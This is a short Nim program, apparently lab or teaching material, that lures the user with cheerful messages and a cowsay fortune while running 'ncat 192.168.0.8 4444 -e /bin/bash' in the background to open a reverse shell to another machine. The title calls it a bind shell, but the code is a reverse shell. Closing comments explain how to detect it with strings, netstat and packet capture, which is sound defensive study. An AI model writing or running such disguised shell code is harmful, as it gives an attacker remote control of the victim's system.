# Basic bind shell

import osproc


echo "Wow! Thanks so much for executing this file!"

echo "You won't regret it!"

echo "Press enter for a fun word of wisdom. :)"

discard readline(stdin)

let (output, _) = execCmdEx("fortune | cowsay")

echo output

discard execCmd("ncat 192.168.0.8 4444 -e /bin/bash &")


# This is an example of a very basic reverse shell -
# It does nothing to hide the fact that it has shellcode calling
# an ncat binary to listen.
# reversing its behavior is extremely easy with a simple 
# strings bindShell | grep bash
# pointing you directly to the shellcode.
# As a network analyst, running netstat on your endpoint will clue you in to an
# errant ncat connection as well.
# Lets see what we find in wireshark though, when we sniff traffic!